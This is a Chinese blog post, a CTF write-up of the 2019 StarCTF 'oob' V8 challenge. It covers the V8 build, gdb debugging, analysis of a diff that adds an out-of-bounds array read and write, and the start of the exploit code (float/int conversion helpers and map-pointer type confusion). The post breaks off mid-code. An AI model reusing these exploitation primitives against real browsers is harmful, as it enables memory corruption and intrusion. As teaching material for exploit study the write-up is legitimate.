      </categories>
      
      
        <tags>
            
            <tag> Fuzz </tag>
            
            <tag> Build </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019-StarCtf-oob</title>
      <link href="posts/7eb4a1e6/"/>
      <url>posts/7eb4a1e6/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>通过 <code>2019-starctf</code>的一道例题尝试入门 <code>v8</code>。跟着前辈们学习并记录一下自己的复现路程。</p><p>环境：Ubuntu 18.04</p><p>题目：<a href="https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip">下载链接</a>:<a href="https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip">https://github.com/0xfocu5/CTF/blob/master/Chrome/2019-starctf-oob.zip</a></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>翻墙 翻墙 翻墙</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ git <span class="built_in">clone</span> https://chromium.googlesource.com/chromium/tools/depot_tools.git <span class="comment">#下载谷歌源码管理器</span></span><br><span class="line">$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:~/depot_tools  <span class="comment">#加入环境变量</span></span><br><span class="line">$ mkdir chromium</span><br><span class="line">$ <span class="built_in">cd</span> chromium</span><br><span class="line">$ fetch --no-history v8  <span class="comment">#获取v8源码</span></span><br><span class="line">$ <span class="built_in">cd</span> v8</span><br></pre></td></tr></table></figure><p>把题目给出的<code>diff</code>文件应用到源码中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ git checkout 6dc88c191f5ecc5389dc26efa3ca0907faef3598</span><br><span class="line">$ gclient sync <span class="comment">#同步solution的各个仓库</span></span><br><span class="line">$ git apply ../oob.diff  <span class="comment">#将diff文件加入到v8中源代码分支中</span></span><br><span class="line">$ ./tools/dev/v8gen.py x64.release</span><br><span class="line">$ ninja -C ./out.gn/x64.release <span class="comment"># Release version</span></span><br><span class="line">$ ./tools/dev/v8gen.py x64.debug</span><br><span class="line">$ ninja -C ./out.gn/x64.debug <span class="comment"># Debug version</span></span><br></pre></td></tr></table></figure><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="V8流程"><a href="#V8流程" class="headerlink" title="V8流程"></a>V8流程</h3><p><code>JavaScript</code>是一门解释型语言，而<code>v8</code>则是<code>chrome</code>浏览器的<code>JavaScript</code>解析引擎，大多数漏洞都是由<code>v8</code>所引起的 (<code>v8</code>编译过后的可执行文件是<code>d8</code>).</p><p><code>JavaScript</code>的执行流程大致如下图：</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/blog/20200922110125.png" alt="image-20200921161412221"></p><ul><li>JS 源代码经过词法分析形成 <code>Token</code>，解析器(Parser)解析<code>token</code>形成抽象语法树(AST)</li><li>解释器(Ignition)将 AST 生成可执行的字节码。解释器可以直接执行字节码，或者通过编译器将其编译为二进制的机器代码再执行。</li><li>解释器执行字节码过程中，如果发现代码被重复执行，热点代码(HotSpot)超过阈值后就会丢给优化编译器(TurboFan)编译成二进制代码，然后优化。下次再执行时则直接执行这段优化后的二进制代码。</li><li>如果JS对象发生变更，优化后的二进制代码变为无效代码，编译器执行反优化，下次执行就回退到解释器解释执行。</li></ul><h3 id="V8调试"><a href="#V8调试" class="headerlink" title="V8调试"></a>V8调试</h3><p>入这个选项就可以在<code>js</code>中调用一些有助于调试的本地运行时函数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%DebugPrint(obj) 输出对象地址</span><br><span class="line">%SystemBreak() 触发调试中断主要结合gdb等调试器使用</span><br></pre></td></tr></table></figure><p>PS:v8团队的专门编写了一个<code>gdb</code>的<code>gdbinit</code>脚本。在<code>~/xxx/v8/tools</code>下，将其更名为<code>gdbinit_v8</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ cp gdbinit_v8 ~/.gdbinit_v8</span><br><span class="line">$ <span class="built_in">cd</span> ~</span><br><span class="line">$ vim .gdbinit</span><br><span class="line"><span class="comment">#加入下面内容</span></span><br><span class="line"><span class="built_in">source</span> ~/.gdbinit_v8</span><br><span class="line"><span class="built_in">source</span> User/xxx/v8/tools/gdb-v8-support.py</span><br></pre></td></tr></table></figure><p>有两个常用命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">job [address_of_obj]  # gdbinit_v8中的特有命令，打印出对象内存结构，注意对象地址为其实际地址加1</span><br><span class="line">telescope [real_address] [num] # pwndbg命令，打印出real_address地址处num个内存单元的值，该地址为真实地址</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line"><span class="keyword">var</span> b = [<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> c = [a, b];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第一次调试</span></span><br><span class="line">%DebugPrint(b);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第二次调试</span></span><br><span class="line">%DebugPrint(c);</span><br><span class="line">%SystemBreak();  <span class="comment">//触发第三次调试</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: &#x2F;home&#x2F;focu5&#x2F;chromium&#x2F;v8&#x2F;out.gn&#x2F;x64.debug&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">...</span><br><span class="line">DebugPrint: 0x2658b5f8df19: [JSArray]</span><br><span class="line"> - map: 0x2507e8002d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3425c3f51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1a4835400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3142d66401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"> ...</span><br><span class="line">pwndbg&gt; job 0x2658b5f8df19</span><br><span class="line">0x2658b5f8df19: [JSArray]</span><br><span class="line"> - map: 0x2507e8002d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3425c3f51111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x1a4835400c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3142d66401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2658b5f8de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>PS：在<code>release</code>使用 <code>job</code>命令会报`No symbol “_v8_internal_Print_Object” in current context. 的错误</p><table><thead><tr><th align="center">map</th><th align="center">表明了一个对象的类型对象b为PACKED_DOUBLE_ELEMENTS类型</th></tr></thead><tbody><tr><td align="center">prototype</td><td align="center">prototype</td></tr><tr><td align="center">elements</td><td align="center">对象元素</td></tr><tr><td align="center">length</td><td align="center">元素个数</td></tr><tr><td align="center">properties</td><td align="center">属性</td></tr></tbody></table><blockquote><p>Value B is an 8 bytes long value //in x64.<br>If B is a double:<br>    B is the binary representation of a double<br>Else:<br>    if B is a int32:<br>        B = the value of B &lt;&lt; 32 // which mean 0xdeadbeef is 0xdeadbeef00000000 in v8<br>    else: // B is a pointer<br>        B = B | 1</p></blockquote><p><code>v8</code>在内存中只有数字和对象两种表示。为了区分两者，v8在所有对象的内存地址末尾都加了1。例：上述 elements的实际地址应为 <code>0x2658b5f8de39-1</code></p><h2 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>分析题目所给出的<code>diff</code>文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">diff --git a&#x2F;src&#x2F;bootstrapper.cc b&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">index b027d36..ef1002f 100644</span><br><span class="line">--- a&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;bootstrapper.cc</span><br><span class="line">@@ -1668,6 +1668,8 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,</span><br><span class="line">                           Builtins::kArrayPrototypeCopyWithin, 2, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;fill&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFill, 1, false);</span><br><span class="line">+    SimpleInstallFunction(isolate_, proto, &quot;oob&quot;,</span><br><span class="line">+                          Builtins::kArrayOob,2,false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;find&quot;,</span><br><span class="line">                           Builtins::kArrayPrototypeFind, 1, false);</span><br><span class="line">     SimpleInstallFunction(isolate_, proto, &quot;findIndex&quot;,</span><br><span class="line">diff --git a&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc b&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">index 8df340e..9b828ab 100644</span><br><span class="line">--- a&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;builtins&#x2F;builtins-array.cc</span><br><span class="line">@@ -361,6 +361,27 @@ V8_WARN_UNUSED_RESULT Object GenericArrayPush(Isolate* isolate,</span><br><span class="line">   return *final_length;</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;  &#x2F;&#x2F; namespace</span><br><span class="line">+BUILTIN(ArrayOob)&#123;</span><br><span class="line">+    uint32_t len &#x3D; args.length();</span><br><span class="line">+    if(len &gt; 2) return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    Handle&lt;JSReceiver&gt; receiver;</span><br><span class="line">+    ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+            isolate, receiver, Object::ToObject(isolate, args.receiver()));</span><br><span class="line">+    Handle&lt;JSArray&gt; array &#x3D; Handle&lt;JSArray&gt;::cast(receiver);</span><br><span class="line">+    FixedDoubleArray elements &#x3D; FixedDoubleArray::cast(array-&gt;elements());</span><br><span class="line">+    uint32_t length &#x3D; static_cast&lt;uint32_t&gt;(array-&gt;length()-&gt;Number());</span><br><span class="line">+    if(len &#x3D;&#x3D; 1)&#123;</span><br><span class="line">+        &#x2F;&#x2F;read</span><br><span class="line">+        return *(isolate-&gt;factory()-&gt;NewNumber(elements.get_scalar(length)));</span><br><span class="line">+    &#125;else&#123;</span><br><span class="line">+        &#x2F;&#x2F;write</span><br><span class="line">+        Handle&lt;Object&gt; value;</span><br><span class="line">+        ASSIGN_RETURN_FAILURE_ON_EXCEPTION(</span><br><span class="line">+                isolate, value, Object::ToNumber(isolate, args.at&lt;Object&gt;(1)));</span><br><span class="line">+        elements.set(length,value-&gt;Number());</span><br><span class="line">+        return ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">+    &#125;</span><br><span class="line">+&#125;</span><br><span class="line"> </span><br><span class="line"> BUILTIN(ArrayPush) &#123;</span><br><span class="line">   HandleScope scope(isolate);</span><br><span class="line">diff --git a&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h b&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">index 0447230..f113a81 100644</span><br><span class="line">--- a&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">+++ b&#x2F;src&#x2F;builtins&#x2F;builtins-definitions.h</span><br><span class="line">@@ -368,6 +368,7 @@ namespace internal &#123;</span><br><span class="line">   TFJ(ArrayPrototypeFlat, SharedFunctionInfo::kDontAdaptArgumentsSentinel)     \</span><br><span class="line">   &#x2F;* https:&#x2F;&#x2F;tc39.github.io&#x2F;proposal-flatMap&#x2F;#sec-Array.prototype.flatMap *&#x2F;   \</span><br><span class="line">   TFJ(ArrayPrototypeFlatMap, SharedFunctionInfo::kDontAdaptArgumentsSentinel)  \</span><br><span class="line">+  CPP(ArrayOob)                                                                \</span><br><span class="line">                                                                                \</span><br><span class="line">   &#x2F;* ArrayBuffer *&#x2F;                                                            \</span><br><span class="line">   &#x2F;* ES #sec-arraybuffer-constructor *&#x2F;                                        \</span><br><span class="line">diff --git a&#x2F;src&#x2F;compiler&#x2F;typer.cc b&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">index ed1e4a5..c199e3a 100644</span><br><span class="line">--- a&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">+++ b&#x2F;src&#x2F;compiler&#x2F;typer.cc</span><br><span class="line">@@ -1680,6 +1680,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) &#123;</span><br><span class="line">       return Type::Receiver();</span><br><span class="line">     case Builtins::kArrayUnshift:</span><br><span class="line">       return t-&gt;cache_-&gt;kPositiveSafeInteger;</span><br><span class="line">+    case Builtins::kArrayOob:</span><br><span class="line">+      return Type::Receiver();</span><br><span class="line"> </span><br><span class="line">     &#x2F;&#x2F; ArrayBuffer functions.</span><br><span class="line">     case Builtins::kArrayBufferIsView:</span><br></pre></td></tr></table></figure><ul><li>自定义了一个函数kArrayOob，可以通过oob调用</li><li>该函数将首先检查参数的数量是否大于2（第一个参数始终是<code>this</code>参数）。如果是，则返回undefined。</li><li>如果只有一个参数（<code>this</code>），则会返回<code>array[length]</code>。</li><li>如果有两个参数（<code>this</code>和<code>value</code>），它将<code>value</code>作为一个浮点数写入<code>array[length]</code>。(以上所述的参数均为cpp中)</li><li>上述逻辑转换为JavaScript中的对应逻辑就是，当<code>oob</code>函数的参数为空时，返回数组对象第length个元素内容；当<code>oob</code>函数参数个数不为0时，就将第一个参数写入到数组中的第length个元素位置。</li></ul><p>编写<code>test.js</code>如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line"><span class="keyword">var</span> addr = a.oob();</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] oob return addr:&quot;</span> + addr.toString());</span><br><span class="line">%SystemBreak();</span><br><span class="line">a.oob(<span class="number">2</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope 0x25641fd4ddd9-1</span><br><span class="line">00:0000│   0x25641fd4ddd8 —▸ 0xe46856c2d99 ◂— 0x400003e40e90401&lt;--- map</span><br><span class="line">01:0008│   0x25641fd4dde0 —▸ 0x3e40e9040c71 ◂— 0x3e40e90408&lt;--- properties</span><br><span class="line">02:0010│   0x25641fd4dde8 —▸ 0x25641fd4dd69 ◂— 0x3e40e90408&lt;--- elements</span><br><span class="line">03:0018│   0x25641fd4ddf0 ◂— 0x300000000&lt;--- length</span><br><span class="line">04:0020│   0x25641fd4ddf8 ◂— 0x0</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope  0x25641fd4dd69-1</span><br><span class="line">00:0000│   0x25641fd4dd68 —▸ 0x3e40e9040851 ◂— 0x3e40e90401</span><br><span class="line">01:0008│   0x25641fd4dd70 ◂— 0x300000000&lt;--- length</span><br><span class="line">02:0010│   0x25641fd4dd78 ◂— 0x100000000&lt;--- elements</span><br><span class="line">03:0018│   0x25641fd4dd80 ◂— 0x200000000&lt;--- elements</span><br><span class="line">04:0020│   0x25641fd4dd88 ◂— 0x300000000&lt;--- elements</span><br><span class="line">05:0028│   0x25641fd4dd90 —▸ 0x3e40e9040851 ◂— 0x3e40e90401&lt;--- map</span><br><span class="line">06:0030│   0x25641fd4dd98 ◂— 0x400000000</span><br><span class="line">07:0038│   0x25641fd4dda0 —▸ 0x39ee928c3b29 ◂— 0x3e40e90409</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">[*] oob return addr:3.38180564031224e-310</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x25641fd4dd90     &lt;--- map pointer</span><br><span class="line">$17 &#x3D; 3.3818056403122411e-310</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope  0x25641fd4dd69-1</span><br><span class="line">00:0000│   0x25641fd4dd68 —▸ 0x3e40e9040851 ◂— 0x3e40e90401</span><br><span class="line">01:0008│   0x25641fd4dd70 ◂— 0x300000000</span><br><span class="line">02:0010│   0x25641fd4dd78 ◂— 0x100000000</span><br><span class="line">03:0018│   0x25641fd4dd80 ◂— 0x200000000</span><br><span class="line">04:0020│   0x25641fd4dd88 ◂— 0x300000000</span><br><span class="line">05:0028│   0x25641fd4dd90 ◂— 0x4000000000000000   &lt;--- 被覆盖</span><br><span class="line">06:0030│   0x25641fd4dd98 ◂— 0x400000000</span><br><span class="line">07:0038│   0x25641fd4dda0 —▸ 0x39ee928c3b29 ◂— 0x3e40e90409</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p &#123;double&#125; 0x25641fd4dd90</span><br><span class="line">$18 &#x3D; 2</span><br></pre></td></tr></table></figure><p>可以发现v8的内存对象大致如下：其中<code>map pointer</code>描述数组对象的结构，<code>element pointer</code>是存储数组元素的结构。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-32 : some pointer &#x2F;&#x2F; not related to the challenge. This is memory is also where the element pointer points at.</span><br><span class="line">-24 : length of segment</span><br><span class="line">-16 : element 0 </span><br><span class="line">-8  : element 1</span><br><span class="line">+0  : map pointer &#x2F;&#x2F; the address where the obj pointer points at</span><br><span class="line">+8  : property pointer</span><br><span class="line">+16 : element pointer &#x2F;&#x2F;pointing at location -32</span><br><span class="line">+24 : length( in the high four bytes )</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> a = [obj, <span class="number">2.2</span>];</span><br><span class="line"></span><br><span class="line">%DebugPrint(a);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ .&#x2F;d8 --allow-natives-syntax .&#x2F;test.js</span><br><span class="line">DebugPrint: 0x3db1856cddd9: [JSArray]</span><br><span class="line"> - map: 0x0306e9582f79 &lt;Map(PACKED_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x1c8177d11111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3db1856cddf9 &lt;FixedArray[2]&gt; [PACKED_ELEMENTS]</span><br><span class="line"> - length: 2</span><br><span class="line"> - properties: 0x1bb28b3c0c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x26c38c5c01a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3db1856cddf9 &lt;FixedArray[2]&gt; &#123;</span><br><span class="line">           0: 0x3db1856cdd81 &lt;Object map &#x3D; 0x306e9580459&gt;</span><br><span class="line">           1: 0x3db1856cde19 &lt;HeapNumber 2.2&gt;</span><br></pre></td></tr></table></figure><p>通过上述例子，我们可以看到我们所泄露出来的地址就是<code>map pointer</code>，而<code>map pointer</code>数组的指示其元素的类型，如果我们利用<code>oob</code>的读取功能将数组对象A的对象类型Map读取出来，然后利用oob的写入功能将这个类型写入数组对象 B，就会导致数组对象B的类型变为了数组对象A的对象类型，这样就造成了类型混淆。</p><p>如果我们定义一个 <code>FloatArray</code> 浮点数数组A，然后定义一个对象数组B。正常情况下，访问A[0]返回的是一个浮点数，访问 B[0] 返回的是一个对象元素。如果将B的类型修改为A的类型，那么再次访问 B[0] 时，返回的就不是对象元素 B[0] ，而是B[0]对象元素转换为浮点数即B[0]对象的内存地址了；如果将A的类型修改为B的类型，那么再次访问 A[0] 时，返回的就不是浮点数 A[0]，而是以 A[0] 为内存地址的一个JavaScript对象了。</p><p>其实到现在可以简化一下漏洞：</p><ul><li>泄露 <code>map pointer</code></li><li>覆写 <code>map pointer</code></li></ul><h4 id="addressOf-amp-amp-fakeObject"><a href="#addressOf-amp-amp-fakeObject" class="headerlink" title="addressOf &amp;&amp; fakeObject"></a>addressOf &amp;&amp; fakeObject</h4><blockquote><p>我们得到的数据都是浮点数的形式，而我们需要的是其在内存中的16进制数据，所以需要浮点数和整数之间的转换</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">&quot;a&quot;</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> objArray = [obj];</span><br><span class="line"><span class="keyword">var</span> floatArray = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> objArrayMap = objArray.oob();</span><br><span class="line"><span class="keyword">var</span> floatArrayMap = floatArray.oob();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> buf =<span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 